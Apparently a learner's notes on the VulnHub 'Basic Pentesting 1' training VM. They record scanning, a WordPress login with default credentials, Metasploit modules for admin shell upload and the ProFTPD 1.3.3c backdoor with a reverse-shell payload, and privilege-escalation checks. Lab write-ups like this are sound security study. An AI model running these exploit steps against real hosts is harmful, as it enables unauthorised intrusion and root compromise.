https://www.vulnhub.com/entry/basic-pentesting-1,216/

Difficulty: EASY


---

**S1REN's Template Reference**

\[OS]: Linux 3.2 - 4.14
\[Web-Technology]: 
\[Hostname]:  
\[IP]:  192.168.100.6 
\[USERS]:   
\[CREDENTIALS]:  
http://vtcsec/secret/wp-login.php - admin:admin

---
\[To-Try LIST]:  

21 ftp     ProFTPD 1.3.3c:
- anonynmous:anonymous failed
- searchsploit
![[Pasted image 20250819112711.png]]

80 http    Apache httpd 2.4.18
/secret - WP Site 
/server-status

Later:
SSH 22 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2


---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).


--- 

\[Web Services Enumeration]:   

-  http://192.168.100.6 
- View Page Source - reveals nothing
- No Robots.txt

dirb $URL /usr/share/wordlists/dirb/common.txt  
Found 13

gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/secret
/server-status: You don't have permission to access this resource.

wpscan --url $URL/secret --disable-tls-checks --enumerate p --enumerate t --enumerate u
XML-RPC seems to be enabled: http://192.168.100.6/secret/xmlrpc.php
WordPress readme found: http://192.168.100.6/secret/readme.html
The external WP-Cron seems to be enabled: http://192.168.100.6/secret/wp-cron.php
WordPress version 4.9 identified (Insecure, released on 2017-11-16).
User(s) Identified:admin 

admin is default WP username - try default password "admin" - - Otherwise brute force??
- success


Many Links - don't resolve: can't find the server at vtccsec
Add vtcsec to /etc/hosts
Now it loads properly:
login page available: http://vtcsec/secret/wp-login.php

wpscan - http://vtcsec/secret/wp-login.php

```
msfconsole
search wp_admin
use exploit/unix/webapp/wp_admin_shell_upload
```
Set values accordingly:
![[Pasted image 20250819114258.png]]
meterpreter session opened


---


\[OTHER / PRIVILEGE-ESCALATION]:   

``` bash
meterpreter> shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@vtcsec:$ 

```

unix-privesc-check from pentest monkey. 
```
meterpreter> upload /usr/bin/unix-privesc-check /tmp/unix-privesc-check
shell
python -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp
chmod +x unix-privesc-check
./unix-privesc-check standard | grep WARNING
```

/etc/passwd - world writable!! -> can work from this



msf6 > search ProFTP 1.3.3c
```msfconsole
 use exploit/unix/ftp/proftpd_133c_backdoor 
show payloads
4 - payload/cmd/unix/reverse 
set payload 4

# run payload - command shell opened
whoami #root
ls
cd root
ls -la



```


--- 
Take Away Concepts: 
Tools utilised:
- netdiscover
- nmap
- dirbuster/gobuster
- 


HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
